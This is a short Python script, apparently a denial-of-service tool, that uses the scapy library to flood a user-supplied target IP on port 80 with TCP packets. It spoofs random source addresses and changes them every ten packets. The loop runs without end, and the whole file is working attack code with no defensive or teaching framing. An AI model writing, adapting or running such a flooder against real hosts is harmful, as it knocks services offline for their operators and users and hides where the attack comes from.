import random
from scapy.all import *
targetIP = raw_input("Hedef IP [Target IP]: ")
i=1

def get_randomSourceIP():
	a = str(random.randint(1,254)) #  a.b.c.d (for instance: a.168.1.1)
	b = str(random.randint(1,254)) # (192.b.c.d)
	c = str(random.randint(1,254)) # (192.168.c.d)
	d = str(random.randint(1,254)) # (192.168.1.d) -> 192.168.1.1
	dot = "."
	src = a+dot+b+dot+c+dot+d
	return src

while 1: 
	source=get_randomSourceIP()
	
	print (source)

	startPort = random.randint(1,1000)
	endPort = random.randint(1000,65535)
	loop_exit = 0
	for srcport in range(startPort,endPort):
		IP1 = IP(src=source, dst=targetIP)
		TCP1 = TCP(sport=srcport, dport=80)
		packet = IP1 / TCP1
		send(packet,inter= .0001)
		print ("packet sent ", i)
		loop_exit = loop_exit+1
		i=i+1
		if loop_exit ==10 : # Each Source IP randomly changes for every 10 steps
			break